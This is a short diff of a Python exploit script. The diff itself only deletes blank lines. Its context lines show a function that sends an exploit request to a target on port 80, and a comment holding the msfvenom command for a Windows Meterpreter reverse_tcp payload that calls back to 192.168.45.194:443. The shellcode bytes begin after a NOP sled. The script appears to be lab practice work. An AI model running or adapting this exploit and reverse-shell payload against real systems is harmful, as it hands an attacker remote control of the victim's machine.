@@ -6,11 +6,9 @@ host = sys.argv[1]
 port = 80
 
 def send_exploit_request():
-	
 	size = 2000
 	
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.194 LPORT=443 -b "\x00\x20\x2e\x2f" -f python -v shellcode   
-	
 	shellcode =  b"\x90" * 20
 	shellcode += b"\xbf\x13\xe9\xec\x8d\xda\xdb\xd9\x74\x24\xf4"
 	shellcode += b"\x58\x29\xc9\xb1\x59\x31\x78\x14\x03\x78\x14"
@@ -81,5 +79,4 @@ def send_exploit_request():
 	s.close()
 
 if __name__ == "__main__": 
-
 	send_exploit_request()
